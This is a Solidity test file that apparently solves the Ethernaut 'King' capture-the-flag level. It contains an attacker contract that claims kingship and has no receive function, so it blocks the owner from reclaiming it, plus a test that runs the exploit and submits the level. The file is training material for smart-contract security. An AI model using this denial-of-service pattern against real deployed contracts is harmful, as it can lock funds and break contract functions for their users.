// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

contract KingAttacker {
  address internal challengeAddress;

  constructor(address _challengeAddress) payable {
    challengeAddress = _challengeAddress;
  }

  function attack() external {
    // will be able to be king, as msg.value = prize
    // as the owner contract do have a receive() function,
    // they will be able to get their price.
    (bool result,) = challengeAddress.call{value: 0.001 ether}("");
    result;
  }

  // this contract does not have a receive function,
  // preventing the owner of the contract to take over kingship back.
}

contract KingTest is Test {
  address internal challengeAddress;
  KingAttacker internal attackerContract;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x3049C00639E6dfC269ED1451764a046f7aE500c6, 0.001 ether);
    attackerContract = new KingAttacker{value: 0.001 ether}(challengeAddress);
  }

  function testExploit() public {
    attackerContract.attack();
    utils.submitLevelInstance(challengeAddress);
  }
}
